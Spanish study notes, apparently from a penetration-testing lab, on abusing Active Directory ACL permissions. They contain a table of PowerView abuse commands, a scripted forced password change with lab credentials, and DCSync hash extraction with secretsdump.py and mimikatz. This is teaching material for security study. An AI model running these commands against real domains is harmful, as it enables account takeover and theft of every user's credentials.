#ACL 
## Enumeración ACL
Las ACEs nos pueden servir para establecer persistencia, escalar privilegios o realizar moviemientos laterales, además de que son muy difíciles de detectar por AV o escáneres de vulnerabilidades. Algunas de las ACEs más importantes las podemos detectar con herramientas como `BloodHound` y abusarlas con `PowerView`, entre otras herramientas posibles
Tabla de ACEs y como se pueden explotar

## Tabla explotación

| **ACL (Permiso/ACE)**   | **Técnica/Herramienta de Abuso**                   | **Descripción del Abuso**                             |
| ----------------------- | -------------------------------------------------- | ----------------------------------------------------- |
| **ForceChangePassword** | `Set-DomainUserPassword`                           | Cambiar la contraseña de un usuario sin conocerla.    |
| **Add Member**          | `Add-DomainGroupMember`                            | Agregar usuarios a grupos, elevando privilegios.      |
| **GenericAll**          | `Set-DomainUserPassword` / `Add-DomainGroupMember` | Control total sobre el objeto (contraseñas/grupos).   |
| **GenericWrite**        | `Set-DomainObject`                                 | Modificar atributos de un objeto de AD.               |
| **WriteOwner**          | `Set-DomainObjectOwner`                            | Cambiar el dueño de un objeto, obteniendo control.    |
| **WriteDACL**           | `Add-DomainObjectACL`                              | Modificar permisos del objeto (ACL).                  |
| **AllExtendedRights**   | `Set-DomainUserPassword` / `Add-DomainGroupMember` | Ejercer derechos avanzados (restablecer contraseñas). |
| **Addself**             | `Add-DomainGroupMember`                            | Agregarse a sí mismo a grupos con privilegios altos.  |
![[Pasted image 20250108092039.png]]
## Enumeración ACL

Es complicado hacerlo de forma manual y genera gran cantidad de información irrelevante (p. ej: `Find-InterestingDomainAcl` genera demasiada información). 
### Búsqueda dirigida - `Get-DomainObjectACL` (PowerView)
Se realiza una búsqueda sobre usuarios sobre los que tenemos el control (supongamos `wley`) y se identifican otros objetos sobre los que este usuario tiene permisos. Se añade la flag `ResolveGUIds` para que los permisos aparezcan en formato más amigable para el usuario
```powershell
$sid = Convert-NameToSid wley 
Get-DomainObjectACL -Identity * | ? {$_.SecurityIdentifier -eq $sid}
```
Si no tuviéramos `PowerView`, aún podríamos obtener un resultado similar escribiendo lo siguiente:
```powershell
Get-ADUser -Filter * | Select-Object -ExpandProperty SamAccountName > ad_users.txt 
foreach($line in [System.IO.File]::ReadLines("C:\Users\htb-student\Desktop\ad_users.txt")) {get-acl "AD:\$(Get-ADUser $line)" | Select-Object Path -ExpandProperty Access | Where-Object {$_.IdentityReference -match 'INLANEFREIGHT\\wley'}}
```
### Sharphound
Es más rápido, visual y potente para auditorías de Active Directory, especialmente para **identificar rutas de escalación de privilegios y relaciones complejas**.
## Ejemplos de abuso de ACEs
### Cambio de contraseña
**Permiso  `User-Force-Change-Password` -> `Set-DomainUserPassword`**
Supongamos que un usuario (`wley`) tiene un permiso `User-Force-Change-Password` sobre otro usuario (`damundsen`)
- Creamos objeto PSCredential para `wley`  con sus credenciales (`$credWley`)
	```powershell
	$SecPassword = ConvertTo-SecureString 'transporter@4' -AsPlainText -Force
	$CredWley = New-Object System.Management.Automation.PSCredential('INLANEFREIGHT\wley', $SecPassword) 
	```
- Creamos otro objeto tipo  `SecureString` para `damundsen` con las credenciales que queramos (`$passDam`)
	```powershell
	$passDam = ConvertTo-SecureString 'Pwn3d_by_ACLs!' -AsPlainText -Force
 
	```
- Cambiamos la contraseña de usuario con `Set-DomainUsePassword` (no haría falta pasar credenciales si estuviéramos autenticados como `wley`)
	```powershell
	Set-DomainUserPassword -Identity damundsen -AccountPassword $passDam -Credential $CredWley -Verbose
	```
### Kerberoasting dirigido
**Permiso  `WriteProperty` | `Self` -> `Set-DomainObject`**
Se crea un SPN falso asociado a la cuenta de usuario que queramos comprometer para craquear posteriormente. [[Kerberoasting#Kerberoasting dirigido| Revisar aquí]]

### DCSync
Son parte de una ACL en AD. Estos privilegios permiten replicar datos del AD. Explota el protocolo Directory Replication Service (DRS), que utilizan los DC para sincronizar datos entre sí. En cuanto a obtención de información es equivalente a NTDS.dit
#### Comprobar usuarios con permisos DCSync
- Listar todos los usuarios ó grupos con permisos `DCSync`
	```powershell
	Get-DomainObjectAcl -SearchBase "DC=inlanefreight,DC=local" -ResolveGUIDs | ? {($_.ObjectType -match 'DS-Replication-Get-Changes|DS-Replication-Get-Changes-All')}
	```
- Comprobar si un usuario (`adunn`) tiene permisos DCSync sobre el dominio
	```powershell
	$sid = Convert-NameToSid adunn
	# $sid= "S-1-5-21-3842939050-3880317879-2865463114-1164"
	Get-ObjectAcl "DC=inlanefreight,DC=local" -ResolveGUIDs | ? { ($_.ObjectAceType -match 'Replication-Get')} | ?{$_.SecurityIdentifier -match $sid} |select AceQualifier, ObjectDN, ActiveDirectoryRights,SecurityIdentifier,ObjectAceType | fl
	# Opción chatgpt
	Get-ObjectAcl "DC=inlanefreight,DC=local" -ResolveGUIDs | ? {($_.SecurityIdentifier -eq (Get-DomainUser adunn).SID)}
	```
#### Extraer hashes NTML y tickets kerberos - `secretsdump.py`

```powershell
python3 /usr/share/doc/python3-impacket/examples/secretsdump.py -outputfile inlanefreight_hashes -just-dc INLANEFREIGHT/adunn@$target
```
- La flag `-just-dc` indica que debe extraer los hashes del archivo NTDS.dit
- Devolverá 3 archivos
#### Extraer hashes NTML y kerberos - `mimikatz`
- Extraer el hash de administrador
	```powershell
	privilege::debug 
	lsadump::dcsync /domain:INLANEFREIGHT.LOCAL /user:INLANEFREIGHT\administrator 
	# Ó con un solo paso y guardando el contenido 
	mimikatz.exe "lsadump::dcsync /domain:INLANEFREIGHT.LOCAL /user:INLANEFREIGHT\administrator" > resultado.txt
	```
- Extraer los hashes de todos los usuarios: 
	```powershell
	`mimikatz.exe "lsadump::dcsync /domain:INLANEFREIGHT.LOCAL /all" > resultado.txt`
	```